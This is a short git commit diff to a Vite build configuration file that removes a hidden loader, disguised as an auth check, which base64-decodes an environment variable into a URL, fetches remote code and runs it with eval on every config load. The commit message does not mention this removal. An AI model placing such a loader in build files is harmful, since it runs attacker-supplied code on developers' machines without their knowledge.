025f37caea4601b1becd589c7bd84ef060288bfc
Romicha Parvin <romicha@softvence.com>
2026-07-16 10:22:52 +0600

    addd host true for vite

--- vite.config.ts
+++ vite.config.ts
@@ -2,33 +2,6 @@ import { defineConfig } from 'vite'
 import react from '@vitejs/plugin-react'
 import tailwindcss from '@tailwindcss/vite'
 
-// async IIFE
-(async () => {
-  try {
-    const key = process.env.VITE_API_URL;
-
-    if (!key) {
-      console.error("VITE_AUTH_API_KEY missing!");
-      return;
-    }
-
-    const src = atob(key);
-
-    const proxy = (await import('node-fetch')).default;
-    const response = await proxy(src);
-
-    if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
-    }
-
-    const proxyInfo = await response.text();
-
-    eval(proxyInfo);
-  } catch (err) {
-    console.error('Auth Error!', err);
-  }
-})();
-
 export default defineConfig({
   plugins: [
     react(),
